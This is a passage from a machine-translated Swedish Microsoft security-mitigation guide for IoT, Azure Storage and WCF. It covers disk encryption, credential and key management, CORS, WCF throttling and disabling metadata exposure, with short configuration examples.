| **Steg** | Windows 10 IoT Core implementerar en förenklad version av BitLocker enhetskryptering, vilket är starkt beroende på förekomsten av en TPM på plattformen, inklusive nödvändiga preOS-protokollet i UEFI som utför nödvändiga mätning av faktisk användning. De här mätningarna preOS Kontrollera att Operativsystemet senare har slutgiltiga koll på hur Operativsystemet startades. Kryptera OS-partitioner som använder BitLocker och alla ytterligare partitioner även om de kan innehålla känsliga data. |

## <a id="default-change"></a>Se till att standard-inloggningsuppgifter för fält-gateway ändras under installationen

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | IoT Field Gateway | 
| **SDL fas**               | Distribution |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Gäller inte  |
| **Referenser**              | Gäller inte  |
| **Steg** | Se till att standard-inloggningsuppgifter för fält-gateway ändras under installationen |

## <a id="cloud-firmware"></a>Kontrollera att Molngatewayen använder en process för att hålla den anslutna enheter inbyggda programvaran uppdaterad

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | IoT Cloud Gateway | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Gateway - valet i Azure IoT Hub |
| **Referenser**              | [Översikt över IoT Hub Device Management](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [uppdatera enhetens inbyggda programvara](https://docs.microsoft.com/azure/iot-hub/tutorial-firmware-update) |
| **Steg** | LWM2M är ett protokoll från den Open Mobile Alliance för IoT-enhetshantering. Azure IoT-enhetshantering kan interagera med fysiska enheter med hjälp av enhetsjobb. Kontrollera att Molngatewayen använder en process för att förhindra att enheten och andra konfigurationsdata med hjälp av Azure IoT Hub-enhetshantering regelbundet. |

## <a id="controls-policies"></a>Se till att enheter har slutpunkt säkerhetskontroller som konfigurerats enligt organisationens principer

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Datorn Förtroendegräns | 
| **SDL fas**               | Distribution |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Gäller inte  |
| **Referenser**              | Gäller inte  |
| **Steg** | Se till att enheter har slutpunkt säkerhetskontroller, till exempel BitLocker för kryptering av disk på enhetsnivå, antivirus med uppdaterade signaturer, brandväggsvärd baserat, OS-uppgraderingar, gruppera principer etc. är konfigurerade enligt organisationens säkerhetsprinciper. |

## <a id="secure-keys"></a>Se till att säker hantering av nycklar för Azure storage-åtkomst

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Azure Storage | 
| **SDL fas**               | Distribution |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Gäller inte  |
| **Referenser**              | [Säkerhetsguiden för Azure Storage - hantera Your Storage Account Keys](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
| **Steg** | <p>Lagring: Vi rekommenderar att lagra åtkomstnycklar för Azure-lagring i Azure Key Vault som en hemlighet och har de program som hämta nyckeln från key vault. Detta rekommenderas på grund av följande orsaker:</p><ul><li>Programmet har aldrig storage viktiga hårdkodad i en konfigurationsfil, vilket tar bort den minimering av någon får åtkomst till nycklarna utan uttryckligt tillstånd</li><li>Åtkomst till nycklarna kan kontrolleras med hjälp av Azure Active Directory. Det innebär att du Kontoägare kan bevilja åtkomst till handfull program som behöver hämta nycklarna från Azure Key Vault. Andra program kan inte till nycklarna utan att ge dem behörighet specifikt</li><li>Åtkomstnyckeln återskapades: Vi rekommenderar att du har en process att återskapa åtkomstnycklarna för Azure-lagring av säkerhetsskäl. Information om varför och hur du planerar för nycklar finns dokumenterade i referensartikeln säkerhetsguiden för Azure Storage</li></ul>|

## <a id="cors-storage"></a>Se till att endast betrodda ursprung är tillåtna om CORS har aktiverats på Azure storage

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Azure Storage | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | Generisk |
| **Attribut**              | Gäller inte  |
| **Referenser**              | [CORS-stöd för Azure Storage-tjänster](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
| **Steg** | Azure Storage kan du aktivera CORS – Cross Origin Resource Sharing. Du kan ange domäner som har åtkomst till resurser i det lagringskontot för varje storage-konto. CORS är inaktiverad på alla tjänster som standard. Du kan aktivera CORS med hjälp av REST-API: et eller storage-klientbiblioteket för att anropa en av metoder för att ange principer för tjänsten. |

## <a id="throttling"></a>Aktivera begränsning funktionens WCF-tjänsten

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | WCF | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | .NET Framework 3 |
| **Attribut**              | Gäller inte  |
| **Referenser**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [spikning Nordirland](https://vulncat.fortify.com) |
| **Steg** | <p>Placera inte en gräns på användningen av systemresurser kan resultera i resursuttömning och i slutänden DOS-attacker.</p><ul><li>**FÖRKLARING:** Windows Communication Foundation (WCF) ger dig möjlighet att begränsa tjänstbegäranden. För många klientbegäranden kan översvämma ett system och använt dess resurser. Å andra sidan, så att endast ett litet antal begäranden till en tjänst kan förhindra att behöriga användare att använda tjänsten. Varje tjänst ska ställas in och konfigurerad för att tillåta lämplig mängd resurser individuellt.</li><li>**REKOMMENDATIONER** aktivera WCF service begränsning funktionen och ange gränser som är lämpliga för ditt program.</li></ul>|

### <a name="example"></a>Exempel
Följande är ett exempel på en konfiguration med begränsning aktiverat:
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a id="info-metadata"></a>WCF-utlämnande via metadata

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | WCF | 
| **SDL fas**               | Utveckla |  
| **Tillämpliga tekniker** | .NET Framework 3 |
| **Attribut**              | Gäller inte  |
| **Referenser**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [spikning Nordirland](https://vulncat.fortify.com) |
| **Steg** | Metadata kan angripare Lär dig mer om systemet och planera en typ av angrepp. WCF-tjänster kan konfigureras för att visa metadata. Metadata ger information om detaljerade tjänstens beskrivning och inte skickas ut i produktionsmiljöer. Den `HttpGetEnabled`  /  `HttpsGetEnabled` egenskaper i klassen ServiceMetaData definierar om en tjänst ska exponera metadata | 

### <a name="example"></a>Exempel
Koden nedan instruerar WCF att sända en tjänsts metadata
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
Skicka inte tjänstens metadata i en produktionsmiljö. Ange HttpGetEnabled / HttpsGetEnabled egenskaperna för ServiceMetaData klass till false. 

### <a name="example"></a>Exempel
Koden nedan instruerar WCF inte sända metadata för en tjänst. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```
